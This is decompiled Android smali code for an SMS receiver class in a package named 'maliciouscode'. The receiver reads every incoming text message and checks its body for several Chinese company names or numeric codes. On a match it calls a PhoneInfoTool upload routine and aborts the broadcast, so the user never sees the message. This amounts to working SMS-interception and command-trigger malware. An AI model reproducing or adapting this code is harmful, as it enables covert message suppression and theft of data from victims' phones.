.class public Lcom/lu/maliciouscode/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"


# static fields
.field public static final SMS_RECEIVED_ACTION:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 19
    const-string v9, "\u6ce8\u610f\uff01\u6709\u77ed\u4fe1"

    const-string v10, "\u51c6\u5907\u86c7\u76ae\u64cd\u4f5c\u4e86"

    invoke-static {v9, v10}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 21
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 22
    .local v0, "action":Ljava/lang/String;
    const-string v9, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v9, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_b

    .line 25
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 27
    .local v1, "bundle":Landroid/os/Bundle;
    if-eqz v1, :cond_b

    .line 30
    const-string v9, "pdus"

    invoke-virtual {v1, v9}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, [Ljava/lang/Object;

    move-object v7, v9

    check-cast v7, [Ljava/lang/Object;

    .line 32
    .local v7, "pdus":[Ljava/lang/Object;
    array-length v9, v7

    new-array v4, v9, [Landroid/telephony/SmsMessage;

    .line 33
    .local v4, "messages":[Landroid/telephony/SmsMessage;
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_0
    array-length v9, v4

    if-ge v3, v9, :cond_0

    .line 35
    aget-object v9, v7, v3

    check-cast v9, [B

    move-object v6, v9

    check-cast v6, [B

    .line 36
    .local v6, "pdu":[B
    invoke-static {v6}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v9

    aput-object v9, v4, v3

    .line 33
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 39
    .end local v6    # "pdu":[B
    :cond_0
    array-length v10, v4

    const/4 v9, 0x0

    :goto_1
    if-ge v9, v10, :cond_b

    aget-object v5, v4, v9

    .line 42
    .local v5, "msg":Landroid/telephony/SmsMessage;
    invoke-virtual {v5}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v2

    .line 43
    .local v2, "content":Ljava/lang/String;
    invoke-virtual {v5}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v8

    .line 45
    .local v8, "sender":Ljava/lang/String;
    const-string v11, "\u8054\u5fc3\u79d1\u6280"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-ne v11, v12, :cond_1

    const-string v11, "001"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-eq v11, v12, :cond_3

    .line 46
    :cond_1
    const-string v11, "\u8054\u5fc3\u79d1\u6280"

    const-string v12, "\u6536\u5230\u5566"

    invoke-static {v11, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 47
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    const/4 v12, 0x1

    invoke-static {v11, v12}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 48
    invoke-virtual {p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    .line 67
    :cond_2
    :goto_2
    invoke-static {v8, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    add-int/lit8 v9, v9, 0x1

    goto :goto_1

    .line 49
    :cond_3
    const-string v11, "\u5907\u4fe1\u79d1\u6280"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-ne v11, v12, :cond_4

    const-string v11, "010"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-eq v11, v12, :cond_5

    .line 50
    :cond_4
    const-string v11, "\u5907\u4fe1\u79d1\u6280"

    const-string v12, "\u6536\u5230\u5566"

    invoke-static {v11, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 51
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    const/4 v12, 0x2

    invoke-static {v11, v12}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 52
    invoke-virtual {p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 53
    :cond_5
    const-string v11, "\u5e94\u7528\u8868\u79d1\u6280"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-ne v11, v12, :cond_6

    const-string v11, "011"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-eq v11, v12, :cond_7

    .line 54
    :cond_6
    const-string v11, "\u5e94\u7528\u8868\u79d1\u6280"

    const-string v12, "\u6536\u5230\u5566"

    invoke-static {v11, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    const/4 v12, 0x3

    invoke-static {v11, v12}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 56
    invoke-virtual {p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 58
    :cond_7
    const-string v11, "\u672a\u77e5\u79d1\u6280"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-ne v11, v12, :cond_8

    const-string v11, "100"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-eq v11, v12, :cond_9

    .line 59
    :cond_8
    const-string v11, "\u672a\u77e5\u79d1\u6280"

    const-string v12, "\u6536\u5230\u5566"

    invoke-static {v11, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    const/4 v12, 0x4

    invoke-static {v11, v12}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 61
    invoke-virtual {p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto :goto_2

    .line 62
    :cond_9
    const-string v11, "\u901a\u8def\u7f51"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-ne v11, v12, :cond_a

    const-string v11, "101"

    invoke-virtual {v2, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-eq v11, v12, :cond_2

    .line 63
    :cond_a
    const-string v11, "\u901a\u8def\u7f51"

    const-string v12, "\u6536\u5230\u5566"

    invoke-static {v11, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 64
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    const/4 v12, 0x5

    invoke-static {v11, v12}, Lcom/lu/maliciouscode/PhoneInfoTool;->upData(Landroid/content/Context;I)V

    .line 65
    invoke-virtual {p0}, Lcom/lu/maliciouscode/SmsReceiver;->abortBroadcast()V

    goto/16 :goto_2

    .line 71
    .end local v1    # "bundle":Landroid/os/Bundle;
    .end local v2    # "content":Ljava/lang/String;
    .end local v3    # "i":I
    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
    .end local v5    # "msg":Landroid/telephony/SmsMessage;
    .end local v7    # "pdus":[Ljava/lang/Object;
    .end local v8    # "sender":Ljava/lang/String;
    :cond_b
    return-void
.end method
